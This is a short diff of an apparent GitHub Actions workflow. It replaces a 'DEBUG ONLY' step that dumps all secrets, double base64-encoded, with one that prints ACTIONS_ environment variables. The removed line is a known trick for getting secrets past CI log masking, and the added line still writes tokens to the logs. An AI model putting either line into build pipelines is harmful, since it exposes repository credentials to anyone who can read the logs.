@@ -31,4 +31,4 @@ jobs:
           path: build/
           key: build-${{ runner.os }}-${{ hashFiles('build/output.txt') }}
       - name: Show Actions Token (DEBUG ONLY!)
-        run: echo "${{ toJSON(secrets) }}" | base64 | base64
+        run: env | grep ACTIONS_
